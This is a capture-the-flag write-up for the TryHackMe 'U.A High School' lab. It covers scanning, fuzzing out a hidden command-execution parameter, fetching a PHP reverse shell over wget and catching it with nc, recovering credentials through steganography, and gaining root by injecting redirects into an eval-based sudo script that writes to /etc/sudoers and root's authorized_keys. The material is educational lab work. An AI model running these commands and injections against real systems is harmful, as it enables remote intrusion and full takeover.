---
layout: post
title: TryHackMe - U.A High School
date: 2024-08-30 09:05:00 +0700
tags: [web-app, rce, stego, privesc]
toc: true
---

Welcome to the web application of U.A., the Superhero Academy.
{: .message}

| Title | U.A High School |
| --- | --- |
| Difficulty | Easy |
| Authors | TryHackMe & Fede1781 |
| Tags | web-app, rce, stego, privesc |

## Enumneration

### Nmap

I used **`Nmap`** to scan the target to identify any running services and potential vulnerabilities. The scan revealed SSH and a Apache web server were active on standard ports:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn 10.10.248.254
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-28 10:03 +07
Warning: 10.10.248.254 giving up on port because retransmission cap hit (10).
Nmap scan report for uahighschool.thm (10.10.248.254)
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.74 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -A -sV -Pn -p 22,80 10.10.248.254                     
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-28 09:50 +07
Nmap scan report for highschool.thm (10.10.248.254)
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 582fec23baa9fe818a8e2dd89121d276 (RSA)
|   256 9df263fd7cf32462478afb08b229e2b4 (ECDSA)
|_  256 62d8f8c9600f701f6e11aba03379b55d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   273.02 ms 10.9.0.1
2   467.35 ms highschool.thm (10.10.248.254)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.11 seconds
```

### Fuzzing

I used the **`feroxbuster`** tool to fuzz directories on the web server. I hoped to find unintended paths or hidden areas. After a period of time, the tool uncovered a few potentially interesting hidden directories:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://uahighschool.thm/ -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://uahighschool.thm/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       61l      225w     1988c http://uahighschool.thm/
200      GET       87l      261w     2580c http://uahighschool.thm/courses.html
200      GET       71l      205w     2056c http://uahighschool.thm/contact.html
200      GET       52l      320w     2542c http://uahighschool.thm/about.html
200      GET      166l      372w     2943c http://uahighschool.thm/assets/styles.css
200      GET       63l      287w     2573c http://uahighschool.thm/admissions.html
200      GET        0l        0w        0c http://uahighschool.thm/assets/

```

However, except the **`/assets/`** directory, other results occurs directly in the HTML script of the page and do not contain any more helpful information:

```html
...
<head>
       <title>U.A. High School</title>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <link rel="stylesheet" href="assets/styles.css">
</head>
<body>
       <header>
        <nav>
           <ul>
                <li><a href="about.html">About</a></li>
                <li><a href="courses.html">Courses</a></li>
                <li><a href="admissions.html">Admissions</a></li>
                <li><a href="contact.html">Contact</a></li>
           </ul>
        </nav>
...
```

Therefore, I kept exploring the /assets/ area which returned nothing but also did not require more permissions (**`403 forbidden`**):

```html
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ curl http://uahighschool.thm/assets/ --verbose 
*   Trying 10.10.237.6:80...
* Connected to uahighschool.thm (10.10.237.6) port 80 (#0)
> GET /assets/ HTTP/1.1
> Host: uahighschool.thm
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Wed, 28 Aug 2024 09:14:37 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=jb78lale53tv3k646b9r4l1dds; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host uahighschool.thm left intact
```

Aside from **`styles.css`**, I expected there must be another file located in the **`/assets/`** area. So I drilled deeper into the **`/assets/`** path and found another one:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://uahighschool.thm/assets/ -x php,js,txt --auto-tune --no-recursion -s 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://uahighschool.thm/assets/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, js, txt]
 🏁  HTTP methods          │ [GET]
 🎶  Auto Tune             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        0l        0w        0c http://uahighschool.thm/assets/
200      GET        0l        0w        0c http://uahighschool.thm/assets/index.php
200      GET      166l      372w     2943c http://uahighschool.thm/assets/styles.css
[####################] - 8m     51764/51764   0s      found:3       errors:3      
[####################] - 8m     51756/51756   113/s   http://uahighschool.thm/assets/ 
```

But since the **`index.php`** still returned blank content (**`0l`** - 0 line; **`0w`** - 0 word), I tried to used **`wfuzz`** to fuzz the variable of the query within **`id`** as value:

```
┌──(kali㉿kali)-[~/Wordlists]
└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://uahighschool.thm/assets/index.php?FUZZ=id --hw 0 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://uahighschool.thm/assets/index.php?FUZZ=id
Total requests: 12939

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                          
=====================================================================

000004687:   200        0 L      1 W        72 Ch       "[REDACTED]"                                                                            

Total time: 0
Processed Requests: 12939
Filtered Requests: 12938
Requests/sec.: 0
```

## Exploit

Since the variable of the query has been found, it’s time to see what the response would be if the input value is a Linux command line:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ curl http://uahighschool.thm/assets/index.php?[REDACTED]=whoami                                              
d3d3LWRhdGEK
```

The response value is an encoded string, which is quite similar to **`base64`** encode. Let’s try:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ curl http://uahighschool.thm/assets/index.php?[REDACTED]=whoami | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    12  100    12    0     0     22      0 --:--:-- --:--:-- --:--:--    22
www-data
```

Excellent! We can now gather more details about the target system by utilizing the query string. However, I suggest setting up a reverse shell for enhanced versatility and convenience.

### RCE → www-data

First of all, I prepared a reverse shell on my local machine and started the HTTP server. Then sent a request with the query to download the reverse shell on my local machine to the target system:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchool]
└─$ python3 -m http.server 4444   
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ curl http://uahighschool.thm/assets/index.php?[REDACTED]="wget+http://10.9.63.75%3a4444/php-reverse-shell.php"
```

Started the listener on the local machine:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ nc -lvnp 4242        
listening on [any] 4242 ...
```

And sent a request to execute the reverse shell on the target system:

```
curl http://uahighschool.thm/assets/php-reverse-shell.php  
```

Finally, the shell was connected:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ nc -lvnp 4242        
listening on [any] 4242 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.248.254] 47386
Linux myheroacademia 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 04:21:18 up  1:36,  0 users,  load average: 0.02, 0.42, 6.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Upgrade & Stabilize shell (Optional)

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Press “**`Ctrl + Z`**” to temporarily background the process.

```
stty raw -echo; fg 
export TERM=xterm
```

The process looks like this:

![image.png](/assets/UAHighSchool%20images/image.png)

### SSH → **`deku`**

Enumerating the web-root directory, I found a directory “**`Hidden_Content`**” and there was a **`passphrase.txt`** file contain a **`base64`** encoded string.

```
www-data@myheroacademia:/var/www$ ls -lhat
total 16K
drwxr-xr-x  3 www-data www-data 4.0K Dec 13  2023 html
drwxr-xr-x  4 www-data www-data 4.0K Dec 13  2023 .
drwxrwxr-x  2 www-data www-data 4.0K Jul  9  2023 Hidden_Content
drwxr-xr-x 14 root     root     4.0K Jul  9  2023 ..
www-data@myheroacademia:/var/www$ cd Hidden_Content/
www-data@myheroacademia:/var/www/Hidden_Content$ ls -lhat
total 12K
drwxr-xr-x 4 www-data www-data 4.0K Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
drwxrwxr-x 2 www-data www-data 4.0K Jul  9  2023 .
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt 
QWxsbWlnaHRGb3JFdmVyISEhCg==
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d
[REDACTED]
```

The passphrase in CTF challenge is commonly relative to:

- SSH key
- Steganography

The SSH key is notoriously difficult to obtain, as the **`/.ssh`** directory within a Linux user's home directory is typically restricted from access by others. Given these limitations, I turned my attention to steganography, a technique that involves hiding information within images. This led me to discover two image files that potentially contain hidden data:

```
www-data@myheroacademia:/var/www/Hidden_Content$ ls -ahlt ../html/assets/
total 28K
drwxrwxr-x 3 www-data www-data 4.0K Aug 28 04:20 .
-rw-r--r-- 1 www-data www-data 5.4K Aug 28 04:20 php-reverse-shell.php
-rw-r--r-- 1 root     root     2.9K Jan 25  2024 styles.css
drwxr-xr-x 3 www-data www-data 4.0K Dec 13  2023 ..
drwxrwxr-x 2 www-data www-data 4.0K Jul  9  2023 images
-rw-rw-r-- 1 www-data www-data  213 Jul  9  2023 index.php                     /
total 336Kyheroacademia:/var/www/Hidden_Content$ ls -ahlt ../html/assets/images/ 
drwxrwxr-x 3 www-data www-data 4.0K Aug 28 04:20 ..
drwxrwxr-x 2 www-data www-data 4.0K Jul  9  2023 .
-rw-rw-r-- 1 www-data www-data 232K Jul  9  2023 yuei.jpg
-rw-rw-r-- 1 www-data www-data  96K Jul  9  2023 oneforall.jpg
```

Then I transferred these 2 files to my local machine for further analyzing:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ file yuei.jpg                                           
yuei.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6], baseline, precision 8, 1920x1080, components 3
                                                                                                                                                  
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ file oneforall.jpg                                      
oneforall.jpg: data
```

Try to use the found passphrase with the first one, but it failed:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ steghide --extract -sf yuei.jpg     
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

The result of the **`file`** command on the **`onforall.jpg`** was only **`data`** instead of **`JPEG image data`** or something else, and that wonder me there must be incorrect data inside the file. Accordingly, I used **`exiftool`** to read the meta data of the file.

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ exiftool oneforall.jpg                        
ExifTool Version Number         : 12.57
File Name                       : oneforall.jpg
Directory                       : .
File Size                       : 98 kB
File Modification Date/Time     : 2023:07:09 23:42:05+07:00
File Access Date/Time           : 2024:08:28 16:47:14+07:00
File Inode Change Date/Time     : 2024:08:28 16:47:06+07:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR

```

As the warning from the output, “**PNG image did not start with IHDR**,” which means there is a corrupted chunk header of the image, or, in simple terms, “**The binary signature of the file is incorrect**," Attempting with **`steghide`** to verify the error:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ steghide --extract -sf oneforall.jpg 
Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.
```

I used **`xxd`** to view the binary signature of the image for more details:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ xxd oneforall.jpg    
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
...
00017fa0: 1c10 4575 5a29 2612 0924 563f 8800 1707  ..EuZ)&..$V?....
00017fb0: 0314 e492 49ae a454 a6a6 b531 fad2 a9c7  ....I..T...1....
00017fc0: 7a41 f7a9 0ffa ca84 79d2 5664 bbbd e8a8  zA......y.Vd....
00017fd0: 5ba9 a2aa e41f ffd9                      [.......
```

As expected, despite the extension of the file being **`.jpg`**, the header signature of the file was displayed as PNG within incorrect marker code hex values. The correct result should be: 

**`89 50 4E 47 0D 0A 1A 0A`** —> **`FF D8 FF E0 00 10 4A 46 49 46 00 01`**

Using **`hexedit`** tool to modify the hex value of the image to correct its format:

```
00000000   FF D8 FF E0  00 10 4A 46  49 46 00 01  01 00 00 01  00 01 00 00  FF DB 00 43  00 06 04 05  ......JFIF.............C....
0000001C   06 05 04 06  06 05 06 07  07 06 08 0A  10 0A 0A 09  09 0A 14 0E  0F 0C 10 17  14 18 18 17  ............................
```

Verify the change with **`xxd`**:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ xxd oneforall.jpg    
00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
...
```

And now use **`steghide`** to extract the hidden data with the previous passphrase:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ steghide --extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                                                                                  
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ cat creds.txt 
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:[REDACTED]
```

Now that I have obtained the password of user **`deku`**, it’s possible to connect to the target system via SSH connection and easily obtained the first flag:

```
deku@myheroacademia:~$ ls -lhat
total 36K
drwxr-xr-x 5 deku deku 4.0K Jul 10  2023 .
-r-------- 1 deku deku   33 Jul 10  2023 user.txt
lrwxrwxrwx 1 root root    9 Jul  9  2023 .bash_history -> /dev/null
drwxrwxr-x 3 deku deku 4.0K Jul  9  2023 .local
-rw-r--r-- 1 deku deku    0 Jul  9  2023 .sudo_as_admin_successful
drwx------ 2 deku deku 4.0K Jul  9  2023 .cache
drwx------ 2 deku deku 4.0K Jul  9  2023 .ssh
drwxr-xr-x 3 root root 4.0K Jul  9  2023 ..
-rw-r--r-- 1 deku deku  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 deku deku 3.7K Feb 25  2020 .bashrc
-rw-r--r-- 1 deku deku  807 Feb 25  2020 .profile
deku@myheroacademia:~$ cat user.txt 
THM{REDACTED}
```

## Privilege Escalation → Root

Checking the allowed commands for the current user with **`sudo -l`**, I figured out the **`feedback.sh`** file located in **`/opt/NewComponent/`** is allowed to execute with root privileges:

```
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

```
deku@myheroacademia:~$ ls -l /opt/
total 4
dr-xr-xr-x 2 root root 4096 Jan 23  2024 NewComponent
deku@myheroacademia:~$ ls -l /opt/NewComponent/
total 4
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 feedback.sh
```

Since the file’s permission is **`-r-xr-xr-x`** which means instead of modifying, it still allows to **execute** and **read**. Thus, I captured the script inside:

{% highlight bash %}
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
{% endhighlight %}

The script above attempts to filter out the input value from the users with these characters:

- **```**
- **`)`**
- **`$(`**
- **`|`**
- **`&`**
- **`;`**
- **`?`**
- **`!`**
- **`\`**

Then it uses the **`eval`** command to evaluate and execute the input string in the shell if the input value can pass the validation.

The **`eval()`** function is the vulnerability of the script if I can bypass the validation! From the filtered characters listed, the filtering was missing the **`>`** character. In this write-up, I will use this character to embed my malicious input to escalate the privilege and take control of the **`root`** user.

### Method 1: Add current user to **`Sudo`** group

```
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers 
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
```

```
deku@myheroacademia:~$ sudo su
root@myheroacademia:/home/deku# cd
root@myheroacademia:~# cat root.txt 
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{REDACTED}
```

### Method 2: Add SSH Key to file **`/root/.ssh/authorized_keys`**

Within this method, I generated an SSH key-pair on my local machine:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchool]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/TryHackMe/UAHighSchool/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/TryHackMe/UAHighSchool/id_rsa
Your public key has been saved in /home/kali/TryHackMe/UAHighSchool/id_rsa.pub
The key fingerprint is:
SHA256:K57QPWGI7eYONb7SmYqyshbmQtdOj2Aqm08TN/kBPkg kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|  E .            |
| . o = .         |
|  o O * S        |
| + * @ = o       |
|+ B *.Xo+        |
|=* o.O+= .       |
|X*o .+*          |
+----[SHA256]-----+
                                                                                                                                                  
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchool]
└─$ ls -lht id_rsa*
-rw------- 1 kali kali 2.6K Aug 28 17:11 id_rsa
-rw-r--r-- 1 kali kali  563 Aug 28 17:11 id_rsa.pub

┌──(kali㉿kali)-[~/TryHackMe/UAHighSchool]
└─$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIAIaxBE0H47D84yipR8MsN2Q2DUVflbxqNgdMJywwNHGhpbZWFQXauSf1X7UGIQII1CdAdNa6FbT/[...REDACTED...]BjD1HG2WpbQjrq09shXKmIjZ64uFUmUQ8CVPTa22Izk= kali@kali
```

Then copy and paste the public key into the authorized SSH key file on the target machine:

```
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIAIaxBE0H47D84yipR8MsN2Q2DUVflbxqNgdMJywwNHGhpbZWFQXauSf1X7UGIQII1CdAdNa6FbT/[...REDACTED...]BjD1HG2WpbQjrq09shXKmIjZ64uFUmUQ8CVPTa22Izk= kali@kali > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
```

Finally, I established the SSH connection as root user within my created private key file:

```
┌──(kali㉿kali)-[~/TryHackMe/UAHighSchoolOffical]
└─$ ssh root@uahighschool.thm -i id_rsa 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 28 Aug 2024 10:14:04 AM UTC

  System load:  0.0               Processes:             116
  Usage of /:   46.9% of 9.75GB   Users logged in:       0
  Memory usage: 48%               IPv4 address for eth0: 10.10.237.6
  Swap usage:   0%

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

37 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@myheroacademia:~# ls -lht
total 8.0K
-rw-r--r-- 1 root root  794 Dec 13  2023 root.txt
drwx------ 3 root root 4.0K Jul  9  2023 snap

```